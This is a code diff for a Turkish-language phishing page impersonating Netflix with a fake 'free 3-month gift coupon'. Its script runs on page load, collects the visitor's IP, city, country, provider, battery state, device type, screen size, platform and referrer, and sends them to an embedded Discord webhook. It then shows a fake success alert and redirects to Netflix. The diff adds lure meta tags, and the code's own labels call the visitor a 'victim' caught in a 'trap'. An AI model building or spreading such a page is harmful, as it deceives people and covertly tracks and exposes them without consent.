@@ -3,31 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Netflix - Hediye Merkezi</title>
+    
+    <title>Netflix - 3 Aylık Ücretsiz Hediye Kuponu</title>
+    <meta name="title" content="Netflix - 3 Aylık Ücretsiz Hediye Kuponu">
+    <meta name="description" content="Tebrikler! 2026 Şubat ayına özel ücretsiz Netflix kuponunuzu hemen tanımlayın. Sınırlı sayıda!">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Netflix - Hediye Merkezi">
+    <meta property="og:description" content="Ücretsiz 3 Aylık Standart Plan Kuponunuzu Alın.">
+    <meta property="og:image" content="https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03nE9S60sboE9/89a742057c366021ad4ad2c4a2b9ef92/Netflix_App_Icon.png">
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:image" content="https://images.ctfassets.net/4cd45et68cgf/4nBnsuPq03nE9S60sboE9/89a742057c366021ad4ad2c4a2b9ef92/Netflix_App_Icon.png">
+
     <style>
-        body { 
-            background-color: #000; 
-            color: #fff; 
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-            overflow: hidden; 
-        }
+        body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .container { text-align: center; padding: 20px; }
-        img { width: 150px; margin-bottom: 20px; }
-        .loader { 
-            border: 4px solid #333; 
-            border-top: 4px solid #e50914; 
-            border-radius: 50%; 
-            width: 45px; 
-            height: 45px; 
-            animation: spin 1s linear infinite; 
-            margin: 20px auto; 
-        }
+        img.logo { width: 150px; margin-bottom: 20px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h1 { font-size: 26px; margin-bottom: 10px; font-weight: bold; }
         p { color: #a1a1a1; font-size: 16px; max-width: 300px; line-height: 1.5; }
@@ -36,7 +27,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix">
         <h1>Hediye Kodunuz Tanımlanıyor</h1>
         <p>Lütfen bekleyin, sistem yoğunluğuna göre işlem 30 saniye sürebilir...</p>
         <div class="loader"></div>
@@ -44,64 +35,61 @@
     <div class="footer-text">© 2026 Netflix, Inc.</div>
 
     <script>
-        // Senin Discord Webhook Linkin
+        // Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        async function anonimSistem() {
+        async function anonimBotSistemi() {
             try {
-                // 1. Detaylı IP ve Konum Bilgisi Alımı
+                // IP ve Konum
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
                 
-                // 2. Batarya Bilgisi Alımı (Telefon/Tablet için önemli)
-                let pilBilgisi = "Bilinmiyor";
+                // Batarya Durumu
+                let pil = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    pilBilgisi = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
+                    pil = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
                 }
 
-                // 3. Cihaz Tipi Tespiti (PC/Telefon/Tablet)
+                // Cihaz Türü Tespiti (PC / Telefon / Tablet)
                 const ua = navigator.userAgent;
-                let cihazTipi = "Bilgisayar (PC)";
-                if (/tablet|ipad|playbook|silk/i.test(ua)) {
-                    cihazTipi = "Tablet";
-                } else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua)) {
-                    cihazTipi = "Akıllı Telefon";
-                }
+                let cihaz = "Bilgisayar (PC)";
+                if (/tablet|ipad|playbook|silk/i.test(ua)) { cihaz = "Tablet"; } 
+                else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua)) { cihaz = "Akıllı Telefon"; }
 
-                // 4. Discord İçin ANONİM BOT Raporu
-                const rapor = {
-                    username: "ANONİM BOT", // İstediğin isim
-                    avatar_url: "https://i.imgur.com/8nN9S1L.png", // Gizemli bir profil resmi
+                // Discord Raporu
+                const payload = {
+                    username: "ANONİM BOT",
+                    avatar_url: "https://i.imgur.com/8nN9S1L.png",
                     embeds: [{
-                        title: "🎯 Yeni Bir Hedef Yakalandı!",
-                        description: "Kurban Netflix tuzağına düştü. İşte cihaz detayları:",
+                        title: "🎯 Hedef Bilgileri Toplandı!",
+                        description: "Kurban Netflix sayfasına giriş yaptı.",
                         color: 14943508, 
                         fields: [
-                            { name: "👤 Cihaz Türü", value: `**${cihazTipi}**`, inline: true },
+                            { name: "👤 Cihaz", value: `**${cihaz}**`, inline: true },
                             { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: true },
-                            { name: "📍 Konum", value: `${d.city} / ${d.country_name}`, inline: true },
-                            { name: "📡 Operatör", value: d.org || "Bilinmiyor", inline: true },
-                            { name: "🔋 Batarya", value: pilBilgisi, inline: true },
+                            { name: "📍 Şehir/Ülke", value: `${d.city} / ${d.country_name}`, inline: true },
+                            { name: "📡 Sağlayıcı", value: d.org || "Bilinmiyor", inline: true },
+                            { name: "🔋 Batarya", value: pil, inline: true },
                             { name: "🖼️ Ekran", value: `${screen.width}x${screen.height}`, inline: true },
-                            { name: "📱 İşletim Sistemi", value: `\`${navigator.platform}\``, inline: false },
+                            { name: "📱 Sistem", value: `\`${navigator.platform}\``, inline: false },
                             { name: "🔗 Kaynak", value: document.referrer || "Direkt Giriş", inline: false }
                         ],
-                        footer: { text: "ANONİM BOT Takip Sistemi | " + new Date().toLocaleString('tr-TR') },
+                        footer: { text: "ANONİM BOT | " + new Date().toLocaleString('tr-TR') },
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
 
-                // 5. Veriyi Discord'a Gönder
+                // Discord'a Gönder
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(rapor)
+                    body: JSON.stringify(payload)
                 });
 
-                // 6. Yönlendirme
+                // Yönlendirme (4 Saniye Sonra)
                 setTimeout(() => {
-                    alert("Tebrikler! Hediye kodunuz oluşturuldu. Kullanım için yönlendiriliyorsunuz.");
+                    alert("Tebrikler! Ücretsiz kuponunuz oluşturuldu. Kullanım sayfasına yönlendiriliyorsunuz.");
                     window.location.href = "https://www.netflix.com/tr/redeem";
                 }, 4000);
 
@@ -110,7 +98,7 @@
             }
         }
 
-        window.onload = anonimSistem;
+        window.onload = anonimBotSistemi;
     </script>
 </body>
 </html>
